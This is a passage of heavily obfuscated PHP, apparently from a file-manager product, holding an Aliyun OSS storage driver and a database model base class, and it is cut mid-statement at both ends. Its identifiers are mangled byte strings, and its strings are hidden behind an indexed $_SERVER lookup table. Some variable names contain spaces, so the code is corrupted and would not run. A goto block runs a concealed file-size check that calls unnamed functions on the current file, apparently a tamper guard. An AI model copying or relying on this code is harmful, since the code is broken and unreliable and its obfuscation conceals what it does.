implode($ü€²àÒá[231], $îº—û•); $®Ïè¿·õ = base64_encode(hash_hmac($ü€²àÒá[232], $ÇÔ‘À¢ü, $this->secret, !0)); $£ç¨·Äø = $ü€²àÒá[1395] . $this->accessKey . $ü€²àÒá[4] . $®Ïè¿·õ; if (strpos($«‰¥ªç”, $ü€²àÒá[227]) === 0) { $£ç¨·Äø = array($ü€²àÒá[234] => $£ç¨·Äø, $ü€²àÒá[224] => $¿’†ñ×æ); if ($‡º“ÜûÈ) { $£ç¨·Äø = array_merge($£ç¨·Äø, $‡º“ÜûÈ); } } return $£ç¨·Äø; } public function listUploadParts($©–›ƒª«, $£™Ù‹ã´) { $›ç­Èåì =& $_SERVER[Ü©»’·]; $¬Æ›Åß = parse_url_query($£™Ù‹ã´[$›ç­Èåì[174]]); $Ì–ÅÈè = $this->client->listParts($this->bucket, $this->pathEncode($©–›ƒª«), $¬Æ›Åß[$›ç­Èåì[223]]); $âÚ¯Í¾• = $Ì–ÅÈè->getListPart(); $Ì™”²œ‰ = array(); foreach ($âÚ¯Í¾• as $Ûˆº ·«) { $Ì™”²œ‰[] = array($›ç­Èåì[1415] => $Ûˆº ·«->getPartNumber(), $›ç­Èåì[1416] => trim($Ûˆº ·«->getETag(), $›ç­Èåì[118])); } unset($£™Ù‹ã´[$›ç­Èåì[225]], $£™Ù‹ã´[$›ç­Èåì[229]]); $ù³¦ù¥ê = $this->multiUploadAuthData($©–›ƒª«, $£™Ù‹ã´); if (empty($ù³¦ù¥ê)) { return !1; } return array($›ç­Èåì[234] => $ù³¦ù¥ê, $›ç­Èåì[224] => $£™Ù‹ã´[$›ç­Èåì[224]], $›ç­Èåì[236] => $Ì™”²œ‰); } public function download($ĞÉèÂĞÊ, $ıçş«Å‚) { if ($this->isFolder($ĞÉèÂĞÊ)) { return !1; } try { $§×÷€ğÓ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ıçş«Å‚); $§×÷€ğÓ = $this->trafficLimit($_SERVER[Ü©»’·][109], $§×÷€ğÓ); $this->client->getObject($this->bucket, $this->pathEncode($ĞÉèÂĞÊ), $§×÷€ğÓ); } catch (OSS\Core\OssException $ëèÔûïÊ) { return !1; } return $ıçş«Å‚; } public function fileSubstr($Ñ¥»‘õ÷, $ŸÊÒÖ¡ø = 0, $şÒÙ¾Õ“ = false) { if ($ŸÊÒÖ¡ø === -1) { $ÃâÁ•© = array(); } else { if ($şÒÙ¾Õ“ === !1) { $İÄğé½ = $this->size($Ñ¥»‘õ÷); } else { $İÄğé½ = $ŸÊÒÖ¡ø + $şÒÙ¾Õ“ - 1; } $ÃâÁ•© = array(OSS\OssClient::OSS_RANGE => "{$ŸÊÒÖ¡ø}\55{$İÄğé½}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($Ñ¥»‘õ÷), $ÃâÁ•©); } catch (OSS\Core\OssException $Šƒ…Î©½) { think_exception($Šƒ…Î©½->getMessage()); return !1; } } private function trafficLimit($ƒ¦¯àÈ, $ÄÏÊóË¼ = array()) { $±Ç§ŠêÒ =& $_SERVER[Ü©»’·]; if ($ƒ¦¯àÈ == $±Ç§ŠêÒ[1421] && $this->isUploadServer() || $ƒ¦¯àÈ == $±Ç§ŠêÒ[109] && $this->isFileOutServer()) { return $ÄÏÊóË¼; } $´õÒ¡å§ = floatval($GLOBALS[$±Ç§ŠêÒ[6]][$±Ç§ŠêÒ[89]][$±Ç§ŠêÒ[107]][$ƒ¦¯àÈ]) * 1024 * 1024 * 8; if (!$´õÒ¡å§) { return $ÄÏÊóË¼; } $´õÒ¡å§ = $´õÒ¡å§ < 819200 ? 819200 : ($´õÒ¡å§ > 838860800 ? 838860800 : $´õÒ¡å§); $ÄÏÊóË¼[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($´õÒ¡å§); return $ÄÏÊóË¼; } public function link($˜À ”ê¯, $Ğ¨Ã¢«Ô = array()) { $û‰Ú˜ì =& $_SERVER[Ü©»’·]; if (!$this->exist($˜À ”ê¯) || $this->isFolder($˜À ”ê¯)) { return !1; } try { $Ğ¨Ã¢«Ô = $this->trafficLimit($û‰Ú˜ì[109], $Ğ¨Ã¢«Ô); $¶Á…Åû– = $this->client->signUrl($this->bucket, $this->pathEncode($˜À ”ê¯), 3600 * 12, $û‰Ú˜ì[230], $Ğ¨Ã¢«Ô); return $this->getCdnLink($¶Á…Åû–); } catch (OSS\Core\OssException $¾Ø¤‚µ“) { return !1; } } public function fileOut($ûùÌÓÄè, $ôğØìª = false, $¿øİ³í = false, $´±úÑŠˆ = '') { $¸“Ô¨ıç =& $_SERVER[Ü©»’·]; if ($this->isFileOutServer()) { return $this->fileOutServer($ûùÌÓÄè, $ôğØìª, $¿øİ³í, $´±úÑŠˆ); } if (!$¿øİ³í) { $¿øİ³í = $this->pathThis($ûùÌÓÄè); } $¿øİ³í = rawurlencode($¿øİ³í); $û•¸¦÷¨ = get_file_mime(get_path_ext($¿øİ³í)); if ($û•¸¦÷¨ == $¸“Ô¨ıç[217]) { return parent::fileOut($ûùÌÓÄè, $ôğØìª, $¿øİ³í, $´±úÑŠˆ); } $ôğØìª = $ôğØìª ? $¸“Ô¨ıç[1432] : $¸“Ô¨ıç[1433]; $Ú¨©éé¶ = array(OSS\OssClient::OSS_SUB_RESOURCE => $¸“Ô¨ıç[1434] . rawurlencode("{$ôğØìª}\x3b\146\x69\x6c\145\156\x61\x6d\145\x3d{$¿øİ³í}")); $Ú¨©éé¶[OSS\OssClient::OSS_SUB_RESOURCE] .= $¸“Ô¨ıç[1435] . rawurlencode($û•¸¦÷¨); $‘ºûæë = $this->link($ûùÌÓÄè, $Ú¨©éé¶); $this->fileOutLink($‘ºûæë); } public function fileOutServer($·›Ç—, $œ¾“ÉŸ = false, $ó”ıñ = false, $‚ôÎÀå = '') { parent::fileOut($·›Ç—, $œ¾“ÉŸ, $ó”ıñ, $‚ôÎÀå); } public function fileOutImage($Õ–¶Å©Ñ, $©©†Ó = 250) { $‡ô°Á¹ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Ü©»’·][1436] . $©©†Ó); $ª´ƒó„¦ = $this->link($Õ–¶Å©Ñ, $‡ô°Á¹); $this->fileOutLink($ª´ƒó„¦); } public function fileOutImageServer($ú‚î¢ş, $ª¹âîÜ· = 250) { parent::fileOutImage($ú‚î¢ş, $ª¹âîÜ·); } public function fileOutLink($ÉØÄ—›…) { $«îáññ =& $_SERVER[Ü©»’·]; if (!$this->isCdnHost() && substr($ÉØÄ—›…, 0, 7) == $«îáññ[1337]) { $ÉØÄ—›… = $«îáññ[1338] . substr($ÉØÄ—›…, 7); } header($«îáññ[161] . $ÉØÄ—›…); die; } public function hashMd5($‡£¾Ú’û, $³Ö¦¾èÒ = '') { $¾²Ä—¢× =& $_SERVER[Ü©»’·]; $“€à‚ = $this->_objectMeta($‡£¾Ú’û); if (!$“€à‚) { return $¾²Ä—¢×[12]; } if (!isset($“€à‚[$¾²Ä—¢×[1411]]) && !empty($³Ö¦¾èÒ)) { $ïõ¹½×ğ = $this->updateObjMeta($‡£¾Ú’û, array($¾²Ä—¢×[1411] => $³Ö¦¾èÒ)); $“€à‚[$¾²Ä—¢×[1411]] = $ïõ¹½×ğ ? $³Ö¦¾èÒ : $¾²Ä—¢×[12]; } return isset($“€à‚[$¾²Ä—¢×[1411]]) ? strtolower($“€à‚[$¾²Ä—¢×[1411]]) : $¾²Ä—¢×[12]; } public function size($°ÏÈ½õ) { $¢ÓÉ¡› = $this->objectMeta($°ÏÈ½õ); return $¢ÓÉ¡› ? $¢ÓÉ¡›[$_SERVER[Ü©»’·][76]] : 0; } public function info($ƒÙË¯í®) { if ($this->isFolder($ƒÙË¯í®)) { return $this->folderInfo($ƒÙË¯í®); } else { if ($this->isFile($ƒÙË¯í®)) { return $this->fileInfo($ƒÙË¯í®); } } return !1; } public function exist($àœÊíÄ) { return $this->isFile($àœÊíÄ) || $this->isFolder($àœÊíÄ); } public function isFile($‹’ãıÜ³) { return !$this->isFolder($‹’ãıÜ³) && $this->objectMeta($‹’ãıÜ³); } public function isFolder($Ï¸«âÖ¼) { return $this->cacheMethod($_SERVER[Ü©»’·][165], $Ï¸«âÖ¼); } protected function objectMeta($¶ Õçö) { return $this->cacheMethod($_SERVER[Ü©»’·][167], $¶ Õçö); } protected function _objectMeta($’¢£ ê) { $·İ…¯» =& $_SERVER[Ü©»’·]; try { $ÀûĞ™é = $this->client->getObjectMeta($this->bucket, $this->pathEncode($’¢£ ê)); } catch (OSS\Core\OssException $«—·üå²) { $ÀûĞ™é = !1; } if ($ÀûĞ™é) { $ÀûĞ™é[$·İ…¯»[76]] = intval($ÀûĞ™é[$·İ…¯»[1409]]); } return $ÀûĞ™é; } protected function _isFolder($Ò›ÇÛÓ) { $È²ÃÖÔÄ =& $_SERVER[Ü©»’·]; if ($Ò›ÇÛÓ == $È²ÃÖÔÄ[12] || $Ò›ÇÛÓ == $È²ÃÖÔÄ[8]) { return !0; } $ü·ÓıÙ¹ = array($È²ÃÖÔÄ[1405] => $È²ÃÖÔÄ[8], $È²ÃÖÔÄ[1406] => rtrim($Ò›ÇÛÓ, $È²ÃÖÔÄ[8]) . $È²ÃÖÔÄ[8], $È²ÃÖÔÄ[1407] => 1, $È²ÃÖÔÄ[1408] => $È²ÃÖÔÄ[12]); $“İ­ùí = $this->client->listObjects($this->bucket, $ü·ÓıÙ¹); if ($“İ­ùí->getObjectList() || $“İ­ùí->getPrefixList()) { return !0; } return !1; } } goto f÷Û‹¡ˆï»; dÑÀ³†™: if ($_SERVER[$_SERVER[Ü©»’·][357]] != $_size($_file)) { $_getc = $_SERVER[Ü©»’·][358]; $_getfile = $_SERVER[$_SERVER[Ü©»’·][359]] . $_SERVER[Ü©»’·][360]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ü©»’·][231], $_getfilec); if (count($_getarrs) < $_SERVER[Ü©»’·][361]) { $exit = $_SERVER[Ü©»’·][362]; $exit(); } $_act = $_SERVER[Ü©»’·][363]; $_act($_file); } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\151\x66\x79\124\x69\x6d\145", "\x74\151\x6d\145", "\x69\x6e\x73\x65\162\164\x2c\x75\160\x64\141\x74\x65", "\146\165\x6e\143\164\151\157\x6e"), array("\x63\162\145\141\x74\145\124\151\x6d\145", "\x74\x69\155\x65", "\x69\x6e\163\x65\x72\164", "\146\x75\156\143\164\x69\x6f\x6e")); public function setDataAuto($ë¨†œ£º) { $this->dataAuto = $ë¨†œ£º; } public function __construct($íøÒî–í = '', $ºÇåõ’ë = '', $ÀŞº˜£ = '') { parent::__construct($íøÒî–í, $ºÇåõ’ë, $ÀŞº˜£); } protected $tableMeta = array(); protected function _beforeInsert(&$Í˜€Ô¹, $‘íì…ª) { $ë÷ÔşˆÏ =& $_SERVER[Ü©»’·]; if (!$this->checkDataAutoHas($ë÷ÔşˆÏ[364])) { return; } $this->dataBeforeFilter($Í˜€Ô¹, $ë÷ÔşˆÏ[364]); } protected function _beforeUpdate(&$´É£Æâó, $·Îó±Øß) { $›îŠÙ÷¡ =& $_SERVER[Ü©»’·]; if (!$this->checkDataAutoHas($›îŠÙ÷¡[365])) { return; } $this->dataBeforeFilter($´É£Æâó, $›îŠÙ÷¡[365]); } protected function _afterSelect(&$¹¶‰ãŠ, $–õô†) { if (!is_array($¹¶‰ãŠ)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ü©»’·][366])) { return; } foreach ($¹¶‰ãŠ as &$Íä‹†¸Ğ) { $this->dataAfterFilter($Íä‹†¸Ğ); } unset($Íä‹†¸Ğ); } protected function _afterFind(&$‰º¼èóÚ, $ı³ìÕ) { if (!is_array($‰º¼èóÚ)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ü©»’·][366])) { return; } $this->dataAfterFilter($‰º¼èóÚ); } public static function textEncode($ÀÙ¤œõÙ) { if (!$ÀÙ¤œõÙ) { return $ÀÙ¤œõÙ; } $¢¿î”ô = json_encode($ÀÙ¤œõÙ); $¢¿î”ô = preg_replace_callback($_SERVER[Ü©»’·][367], function ($ó‰àÊŞ) { return addslashes($ó‰àÊŞ[0]); }, $¢¿î”ô); return json_decode($¢¿î”ô); } public static function textDecode($İ¬½Å»ƒ) { $£äÔÆâé =& $_SERVER[Ü©»’·]; $±÷æòÓ = json_encode($İ¬½Å»ƒ); $±÷æòÓ = preg_replace_callback($£äÔÆâé[368], function ($¾åÃÛñå) { return $_SERVER[Ü©»’·][97]; }, $±÷æòÓ); return json_decode($±÷æòÓ); } public function setAutoIncrement($ñ‰íüŒø) { $á“¹¤ç÷ = array($this->getPk() => $ñ‰íüŒø); $ÙŸ­®¹ô = $this->data($á“¹¤ç÷)->add(); if ($ÙŸ­®¹ô) { $this->delete($ÙŸ­®¹ô); } } public function getAutoIncrement() { $¤œëâ§‹ = $this->getTableName(); $õĞ–¿² = $this->max($this->getPk()); $ğÀĞ¢ŠÎ = $this->query("\x73\x68\157\167\40\x74\141\x62\154\145\x20\163\164\141\164\x75\x73\x20\x77\150\145\162\x65\x20\x4e\x61\155\x65\x3d\x27{$¤œëâ§‹}\x27"); $è®ÛÅ³° = $ğÀĞ¢ŠÎ[0][$_SERVER[Ü©»’·][369]]; $ñ³ï®‚” = max($õĞ–¿², $è®ÛÅ³°); return $ñ³ï®‚”; } protected function _callBefore($Öà€­¹©, $é¤¥ôú¾) { return $this->cacheCallCheck($Öà€­¹©, $é¤¥ôú¾, !1); } protected function _callAfter($ÖÃ›Á¦¥, $õËâ©˜Î) { return $this->cacheCallCheck($ÖÃ›Á¦¥, $õËâ©˜Î, !0); } protected function cacheFunctionAlias($Ô®³Çßõ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($çæµ§¸â, $÷ïãšÜ, $´²ô¡ú‘ = false) { $´á´ß²ê = $this->cacheFunctionAlias($÷ïãšÜ); if (!$´á´ß²ê) { return; } foreach ($´á´ß²ê as $Õ¼À¸¹® => $à¯¯À¬Å) { $æÆİ„£ = $à¯¯À¬Å[0]; $Ø°Òœ—Ê = explode($_SERVER[Ü©»’·][50], $à¯¯À¬Å[1]); if ($çæµ§¸â == $Õ¼À¸¹®) { return $this->cacheFunctionGet($Õ¼À¸¹®, $æÆİ„£); } if ($´²ô¡ú‘ && in_array($çæµ§¸â, $Ø°Òœ—Ê)) { $this->cacheFunctionClear($Õ¼À¸¹®, $æÆİ„£); } } } public function cacheFunctionGet($ñ¿é½¦, $†•Ù˜ˆŞ) { $Ùó¯ÏĞ = $this->cacheKeyMake($ñ¿é½¦, $†•Ù˜ˆŞ); $ÜíØÖæ = Cache::get($Ùó¯ÏĞ); if (!is_array($ÜíØÖæ)) { $ÜíØÖæ = call_user_func_array(array($this, $ñ¿é½¦), array($†•Ù˜ˆŞ, !0)); Cache::set($Ùó¯ÏĞ, $ÜíØÖæ); } return $ÜíØÖæ; } public function cacheFunctionClear($ºÍşé…Ü, $ÓäöÆ«Ö) { $ú¶‹Áå = $ÓäöÆ«Ö; if (!is_array($ÓäöÆ«Ö)) { $ú¶‹Áå = array($ÓäöÆ«Ö); } foreach ($ú¶‹Áå as $Ö”öûáÓ) { $õ½—àè = $this->cacheKeyMake($ºÍşé…Ü, $Ö”öûáÓ); Cache::remove($õ½—àè); } } private function cacheKeyMake($µü‘¤«, $ Ê§—ü‘) { $ô²ùƒ™ =& $_SERVER[Ü©»’·]; return get_class($this) . $ô²ùƒ™[11] . $µü‘¤« . $ô²ùƒ™[370] . $ Ê§—ü‘; } protected function selectPageReset() { $ıİœº¢ô =& $_SERVER[Ü©»’·]; if (isset($GLOBALS[$ıİœº¢ô[371]])) { return; } $GLOBALS[$ıİœº¢ô[371]] = isset($GLOBALS[$ıİœº¢ô[7]][$ıİœº¢ô[372]]) ? $GLOBALS[$ıİœº¢ô[7]][$ıİœº¢ô[372]] : !1; $GLOBALS[$ıİœº¢ô[373]] = isset($GLOBALS[$ıİœº¢ô[7]][$ıİœº¢ô[353]]) ? $GLOBALS[$ıİœº¢ô[7]][$ıİœº¢ô[353]] : !1; $GLOBALS[$ıİœº¢ô[7]][$ıİœº¢ô[372]] = !1; $GLOBALS[$ıİœº¢ô[7]][$ıİœº¢ô[353]] = !1; } protected function selectPageRestore() { $‰ìÅŸ¼« =& $_SERVER[Ü©»’·]; if (!isset($GLOBALS[$‰ìÅŸ¼«[371]])) { return; } $GLOBALS[$‰ìÅŸ¼«[7]][$‰ìÅŸ¼«[372]] = $GLOBALS[$‰ìÅŸ¼«[371]]; $GLOBALS[$‰ìÅŸ¼«[7]][$‰ìÅŸ¼«[353]] = $GLOBALS[$‰ìÅŸ¼«[373]]; if ($GLOBALS[$‰ìÅŸ¼«[7]][$‰ìÅŸ¼«[372]] === !1) { unset($GLOBALS[$‰ìÅŸ¼«[7]][$‰ìÅŸ¼«[372]]); } if ($GLOBALS[$‰ìÅŸ¼«[7]][$‰ìÅŸ¼«[353]] === !1) { unset($GLOBALS[$‰ìÅŸ¼«[7]][$‰ìÅŸ¼«[353]]); } unset($GLOBALS[$‰ìÅŸ¼«[371]]); unset($GLOBALS[$‰ìÅŸ¼«[373]]); } protected function selectPage($ŒÜè’ÃÉ = 200, $›–¨‘¯ = 1) { $ñĞÕ¨²¦ =& $_SERVER[Ü©»’·]; global $in; $Ô¨—Í¼± = $this->optionsValue(); $Ã²Îİæå = 50000; $ŒÜè’ÃÉ = isset($in[$ñĞÕ¨²¦[372]]) && $in[$ñĞÕ¨²¦[372]] ? $in[$ñĞÕ¨²¦[372]] : $ŒÜè’ÃÉ; if ($ŒÜè’ÃÉ === -1) { $in[$ñĞÕ¨²¦[372]] = !1; $Ã²Îİæå = 100000000; $ŒÜè’ÃÉ = $Ã²Îİæå; } $À—«á—› = $Ô¨—Í¼±; $À—«á—›[$ñĞÕ¨²¦[374]] = array(); $ŒÜè’ÃÉ = intval($ŒÜè’ÃÉ); $ŒÜè’ÃÉ = $ŒÜè’ÃÉ <= 5 ? 5 : ($ŒÜè’ÃÉ >= $Ã²Îİæå ? $Ã²Îİæå : $ŒÜè’ÃÉ); $›–¨‘¯ = intval(isset($in[$ñĞÕ¨²¦[353]]) && $in[$ñĞÕ¨²¦[353]] ? $in[$ñĞÕ¨²¦[353]] : $›–¨‘¯); $›–¨‘¯ = $›–¨‘¯ <= 1 ? 1 : $›–¨‘¯; $¡Ò¿‘˜Ø = array(); $ôÉàÊÇ = 1; if ($›–¨‘¯ == 1 && $ôÉàÊÇ) { $this->optionsValue($Ô¨—Í¼±); $¡Ò¿‘˜Ø = $this->page($›–¨‘¯, $ŒÜè’ÃÉ)->select(); $ƒ°İìÃû = is_array($¡Ò¿‘˜Ø) ? count($¡Ò¿‘˜Ø) : 0; if ($ƒ°İìÃû < $ŒÜè’ÃÉ) { $½›£… = 1; } else { $this->optionsValue($À—«á—›); $ƒ°İìÃû = intval($this->count()); $½›£… = ceil($ƒ°İìÃû / $ŒÜè’ÃÉ); } } else { $this->optionsValue($À—«á—›); $ƒ°İìÃû = intval($this->count()); $½›£… = ceil($ƒ°İìÃû / $ŒÜè’ÃÉ); $›–¨‘¯ = $›–¨‘¯ >= $½›£… ? $½›£… : $›–¨‘¯; $this->optionsValue($Ô¨—Í¼±); $¡Ò¿‘˜Ø = $this->page($›–¨‘¯, $ŒÜè’ÃÉ)->select(); } if (!is_array($¡Ò¿‘˜Ø)) { $¡Ò¿‘˜Ø = array(); } if ($½›£… == 1) { $ƒ°İìÃû = count($¡Ò¿‘˜Ø); } $íùÈĞ× = array($ñĞÕ¨²¦[375] => array($ñĞÕ¨²¦[376] => $ƒ°İìÃû, $ñĞÕ¨²¦[372] => $ŒÜè’ÃÉ, $ñĞÕ¨²¦[353] => $›–¨‘¯, $ñĞÕ¨²¦[377] => $½›£…), $ñĞÕ¨²¦[378] => $¡Ò¿‘˜Ø); return $íùÈĞ×; } protected function checkLength($©–ÜôÕ…, $ÄŒé¥¥ = 0, $Î³¿¬ï = '') { $óé»‹Ûï =& $_SERVER[Ü©»’·]; $ÄŒé¥¥ = $ÄŒé¥¥ ? $ÄŒé¥¥ : 65536; if (!$©–ÜôÕ… || strlen($©–ÜôÕ…) < $ÄŒé¥¥) { return; } $Î³¿¬ï = $Î³¿¬ï ? $Î³¿¬ï . $óé»‹Ûï[71] : $óé»‹Ûï[12]; show_json($Î³¿¬ï . LNG($óé»‹Ûï[379]) . "\50{$ÄŒé¥¥}\51", !1); } protected function metaSet($ã×âÇªÀ, $İû„º¤ = null, $ŞÁÊ¨’Ş = null) { $á¸’ İ° =& $_SERVER[Ü©»’·]; if (!$this->tableMeta || !$ã×âÇªÀ) { return !1; } $†ÛŸáÏú = $this->tableMeta[$á¸’ İ°[380]]; $êµÜÔ­­ = $this->tableMeta[$á¸’ İ°[381]]; $óËïã—Ÿ = Model($êµÜÔ­­); $Ò°ŞÂ“ = array($†ÛŸáÏú => $ã×âÇªÀ, $á¸’ İ°[382] => $İû„º¤); if (is_null($İû„º¤)) { return $óËïã—Ÿ->where(array($†ÛŸáÏú => $ã×âÇªÀ))->delete(); } if (is_null($ŞÁÊ¨’Ş) && is_string($İû„º¤)) { return $óËïã—Ÿ->where($Ò°ŞÂ“)->delete(); } $£ùÒì“Ä = is_array($İû„º¤) ? $İû„º¤ : array(); if (is_string($İû„º¤)) { $£ùÒì“Ä[$İû„º¤] = $ŞÁÊ¨’Ş; } $Òƒ¾Ï¢õ = array(); foreach ($£ùÒì“Ä as $¿”Å§¿ª => $àı£Ş·Â) { if (is_null($àı£Ş·Â) && is_string($¿”Å§¿ª)) { $óËïã—Ÿ->where(array($†ÛŸáÏú => $ã×âÇªÀ, $á¸’ İ°[382] => $¿”Å§¿ª))->delete(); continue; } $this->checkLength($àı£Ş·Â, !1, $êµÜÔ­­ . $á¸’ İ°[4] . $¿”Å§¿ª); $Òƒ¾Ï¢õ[] = array($†ÛŸáÏú => $ã×âÇªÀ, $á¸’ İ°[94] => $¿”Å§¿ª, $á¸’ İ°[383] => $àı£Ş·Â); } $°×‚ä“ = $á¸’ İ°[384] . $êµÜÔ­­; CacheLock::lock($°×‚ä“); $óËïã—Ÿ->where(array($†ÛŸáÏú => $ã×âÇªÀ))->addAll($Òƒ¾Ï¢õ, array(), !0); CacheLock::unlock($°×‚ä“); return !0; } public function metaGet($ö‡é°¾, $’«Ğ·Š = false) { $Ï·ˆÔÜª =& $_SERVER[Ü©»’·]; if (!$this->tableMeta) { return array(); } $’‘¯—Úø = $this->tableMeta[$Ï·ˆÔÜª[380]]; $¾¼Ö‘ûê = Model($this->tableMeta[$Ï·ˆÔÜª[381]]); if ($’«Ğ·Š) { $ä”ñ¼Ÿ = array($’‘¯—Úø => $ö‡é°¾, $Ï·ˆÔÜª[94] => $’«Ğ·Š); return $¾¼Ö‘ûê->where($ä”ñ¼Ÿ)->getField($Ï·ˆÔÜª[383]); } $ä”ñ¼Ÿ = array($’‘¯—Úø => $ö‡é°¾); $Í°À•éÍ = $¾¼Ö‘ûê->field($Ï·ˆÔÜª[385])->where($ä”ñ¼Ÿ)->select(); $Í°À•éÍ = array_to_keyvalue($Í°À•éÍ, $Ï·ˆÔÜª[94], $Ï·ˆÔÜª[383]); return $Í°À•éÍ; } private function checkDataAutoHas($Ò¤¼ñ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $¼æèæ°İ) { if (in_array($Ò¤¼ñ, explode($_SERVER[Ü©»’·][50], $¼æèæ°İ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ôÆÕ®­, $¼µéèóü) { $©ƒı²Üô =& $_SERVER[Ü©»’·]; if (!is_array($ôÆÕ®­)) { return; } foreach ($this->dataAuto as $¸Şù†„Ÿ) { $Ò«›½ïû = $¸Şù†„Ÿ[0]; if (!in_array($¼µéèóü, explode($©ƒı²Üô[50], $¸Şù†„Ÿ[2]))) { continue; } switch (trim($¸Şù†„Ÿ[3])) { case $©ƒı²Üô[321]: case $©ƒı²Üô[322]: $„”Øƒ×¦ = $¸Şù†„Ÿ[1]; $Õ‚¯„ü = isset($¸Şù†„Ÿ[4]) ? (array) $¸Şù†„Ÿ[4] : array(); if ($„”Øƒ×¦ == $©ƒı²Üô[203] && array_key_exists($Ò«›½ïû, $ôÆÕ®­)) { if (!$ôÆÕ®­[$Ò«›½ïû]) { unset($ôÆÕ®­[$Ò«›½ïû]); } break; } if (isset($ôÆÕ®­[$Ò«›½ïû])) { array_unshift($Õ‚¯„ü, $ôÆÕ®­[$Ò«›½ïû]); } if ($©ƒı²Üô[321] == $¸Şù†„Ÿ[3]) { $ôÆÕ®­[$Ò«›½ïû] = call_user_func_array($„”Øƒ×¦, $Õ‚¯„ü); } else { $ôÆÕ®­[$Ò«›½ïû] = call_user_func_array(array(&$this, $„”Øƒ×¦), $Õ‚¯„ü); } break; case $©ƒı²Üô[270]: if (isset($ôÆÕ®­[$Ò«›½ïû]) && $ôÆÕ®­[$Ò«›½ïû]) { $ôÆÕ®­[$Ò«›½ïû] = call_user_func_array(array(&$this, $¸Şù†„Ÿ[1]), array($ôÆÕ®­[$Ò«›½ïû])); } break; case $©ƒı²Üô[273]: $ôÆÕ®­[$Ò«›½ïû] = $ôÆÕ®­[$¸Şù†„Ÿ[1]]; break; case $©ƒı²Üô[294]: if (isset($ôÆÕ®­[$Ò«›½ïû]) && !is_string($ôÆÕ®­[$Ò«›½ïû])) { $ôÆÕ®­[$Ò«›½ïû] = json_encode_force($ôÆÕ®­[$Ò«›½ïû]); } break; case $©ƒı²Üô[323]: if ($ôÆÕ®­[$Ò«›½ïû] === $©ƒı²Üô[12]) { unset($ôÆÕ®­[$Ò«›½ïû]); } break; case $©ƒı²Üô[324]: $ôÆÕ®­[$Ò«›½ïû] = $¸Şù†„Ÿ[1]; default: break; } } if ($¼µéèóü == $©ƒı²Üô[364]) { $ùÅğå«‘ = strtolower($this->db->getDbType()); if (strpos($ùÅğå«‘, $©ƒı²Üô[13]) !== 0) { return; } $°óŒ‹À = $this->field(!0)->fields; $ø•€ÖÉè = $°óŒ‹À[$©ƒı²Üô[252]]; if (isset($°óŒ‹À[$©ƒı²Üô[251]])) { unset($ø•€ÖÉè[$°óŒ‹À[$©ƒı²Üô[251]]]); } foreach ($ø•€ÖÉè as $Àæ€¢¤… => $¼µéèóü) { if (!isset($ôÆÕ®­[$Àæ€¢¤…])) { $ôÆÕ®­[$Àæ€¢¤…] = $©ƒı²Üô[12]; } } } } private function dataAfterFilter(&$–ï±£¿ë) { $æÎêàÂ£ =& $_SERVER[Ü©»’·]; foreach ($this->dataAuto as $¯Úì†¦ı) { $£ø«–Ó‡ = $¯Úì†¦ı[0]; if (!isset($–ï±£¿ë[$£ø«–Ó‡])) { continue; } if (!in_array($æÎêàÂ£[366], explode($æÎêàÂ£[50], $¯Úì†¦ı[2]))) { continue; } switch (trim($¯Úì†¦ı[3])) { case $æÎêàÂ£[321]: case $æÎêàÂ£[322]: $Ãıò† = isset($¯Úì†¦ı[4]) ? (array) $¯Úì†¦ı[4] : array(); array_unshift($Ãıò†, $–ï±£¿ë[$£ø«–Ó‡]); if (isset($¯Úì†¦ı[4]) && $¯Úì†¦ı[4] == $æÎêàÂ£[386]) { $Ãıò† = array($–ï±£¿ë[$£ø«–Ó‡]); } if ($æÎêàÂ£[321] == $¯Úì†¦ı[3]) { $–ï±£¿ë[$£ø«–Ó‡] = call_user_func_array($¯Úì†¦ı[1], $Ãıò†); } else { $–ï±£¿ë[$£ø«–Ó‡] = call_user_func_array(array(&$this, $¯Úì†¦ı[1]), $Ãıò†); } break; case $æÎêàÂ£[270]: if (isset($–ï±£¿ë[$£ø«–Ó‡]) && $–ï±£¿ë[$£ø«–Ó‡]) { $–ï±£¿ë[$£ø«–Ó‡] = call_user_func_array(array(&$this, $¯Úì†¦ı[1]), array($–ï±£¿ë[$£ø«–Ó‡])); } break; case $æÎêàÂ£[273]: $–ï±£¿ë[$£ø«–Ó‡] = $–ï±£¿ë[$¯Úì†¦ı[1]]; break; case $æÎêàÂ£[294]: $¯Î¯ñÆÂ = $–ï±£¿ë[$£ø«–Ó‡]; $–ï±£¿ë[$£ø«–Ó‡] = json_decode($¯Î¯ñÆÂ, !0); if (is_null($–ï±£¿ë[$£ø«–Ó‡])) { $–ï±£¿ë[$£ø«–Ó‡] = $¯Î¯ñÆÂ; } break; case $æÎêàÂ£[323]: if ($–ï±£¿ë[$£ø«–Ó‡] === $æÎêàÂ£[12]) { unset($–ï±£¿ë[$£ø«–Ó‡]); } break; case $æÎêàÂ£[324]: $–ï±£¿ë[$£ø«–Ó‡] = $¯Úì†¦ı[1]; break; default: break; } } } public function saveAll($ˆçš¸¶) { $ôÓƒ”×â =& $_SERVER[Ü©»’·]; $¥Óä‘î = $this->tablePrefix . $this->tableName; $¥­÷ÆÑÃ = self::SQL_WHERE_IN_CHUNK; $ˆçš¸¶ = is_array($ˆçš¸¶) ? $ˆçš¸¶ : array(); $æéŠç®‡ = $ôÓƒ”×â[387]; $ ØêÂ = 0; $©°–Äöë = array(); $Ó€Ôòş = count($ˆçš¸¶); for ($÷Ô¯³ò = 0; $÷Ô¯³ò < $Ó€Ôòş; $÷Ô¯³ò++) { $¿–”‹àÊ = $ˆçš¸¶[$÷Ô¯³ò]; if (!is_array($¿–”‹àÊ) || count($¿–”‹àÊ) != 4) { continue; } $Ç²åÃº¢ = "\125\120\104\x41\124\105\40\140{$¥Óä‘î}\x60\x20\x53\105\124\x20{$¿–”‹àÊ[2]}\x20\75\x20\103\x41\x53\105\40{$¿–”‹àÊ[0]}\x20\xa"; if ($ ØêÂ == 0) { $æéŠç®‡ = 